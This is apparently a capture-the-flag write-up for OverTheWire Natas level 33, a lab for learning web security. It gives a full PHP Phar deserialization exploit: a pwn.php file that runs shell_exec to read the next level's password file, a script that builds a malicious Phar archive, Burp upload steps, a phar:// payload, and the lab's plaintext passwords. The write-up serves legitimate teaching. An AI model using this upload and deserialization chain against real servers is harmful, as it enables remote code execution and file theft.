# Natas CTF Solutions  

## Natas Level 33  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit **PHP Object Injection** using a **Phar deserialization attack** to execute arbitrary code and extract the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas33.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas33`  
- **Password:** Use the password from Natas Level 32:  
```
2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```  

![Home_Page](https://github.com/user-attachments/assets/e5b76c2c-2575-42ff-8aa7-9fbefaf6b1f0)

---

### **Step 3: Review the Source Code**  
The source code shows that the website accepts file uploads.  
The challenge is to create a **malicious PHP file** and use a **Phar deserialization attack** to execute arbitrary code.  

![Source_Code](https://github.com/user-attachments/assets/dce46bae-3283-4428-be7b-cc16211b03e7)

---

### **Step 4: Create a PHP File to Read the Password**  
Create a file named `pwn.php` with the following code:  

```php
<?php 
echo shell_exec('cat /etc/natas_webpass/natas34'); 
?>
```  

✅ **Explanation:**  
- `shell_exec()` → Executes the `cat` command to read the password file.  

---

### **Step 5: Create a `test.php` File for Phar Deserialization**  
Create a file named `test.php`:  

```php
<?php
class Executor {
    private $filename = "pwn.php"; 
    private $signature = True;
    private $init = false;
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", 'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Executor();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```

✅ **Explanation:**  
- This code creates a **Phar archive** with serialized metadata.  
- The `filename` is set to `pwn.php`, which allows for execution.  
- Phar deserialization allows loading the serialized object and executing commands.  

---

### **Step 6: Generate the Phar File**  
Run the following command to create the `test.phar` file:  

```bash
php -d phar.readonly=false test.php
```  

✅ **Explanation:**  
- `-d phar.readonly=false` → Disables read-only mode to create the Phar file.  

---

### **Step 7: Upload the PHP and Phar Files**  
1. Upload **pwn.php** using the file upload option.  
2. Use **Burp Suite** to capture the upload request.  
3. Rename the file to `pwn.php` in the request and forward it.  

![BurpSuite](https://github.com/user-attachments/assets/30177439-23e6-48c6-8a08-f16a20ad99f1)

---

### **Step 8: Upload the Phar File and Modify the Request**  
1. Upload `test.phar` using the file upload option.  
2. Capture the request using **Burp Suite**.  

![image](https://github.com/user-attachments/assets/0b41ace1-7125-4bc5-9cfc-797fd75e19df)

3. In **Repeater**, modify the request to use:  

```http
phar://test.phar/test.txt
```  

4. Send the request — the password will be printed!  

![Phar_Upload](https://github.com/user-attachments/assets/c1b1051e-53ea-4a6a-acd1-d12247aed037)

---

### **✅ Password for Natas Level 34**  
```
j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```

---

## 💡 **Lessons Learned**  
✔️ **Phar Deserialization:** Phar archives allow serialization of metadata, which can lead to command execution if improperly handled.  
✔️ **Command Injection:** Combining file upload and deserialization can lead to RCE (Remote Code Execution).  
✔️ **Burp Suite Manipulation:** Intercepting and modifying HTTP requests allows for bypassing security checks.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 4 – PHP File Upload | ![BurpSuite](https://github.com/user-attachments/assets/30177439-23e6-48c6-8a08-f16a20ad99f1) |  
| Step 8 – Phar Exploit | ![Phar_Upload](https://github.com/user-attachments/assets/c1b1051e-53ea-4a6a-acd1-d12247aed037) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 34**:  
👉 [http://natas34.natas.labs.overthewire.org](http://natas34.natas.labs.overthewire.org)  

---

🔥 Phar deserialization for the win! Keep going — you're making great progress! 😎
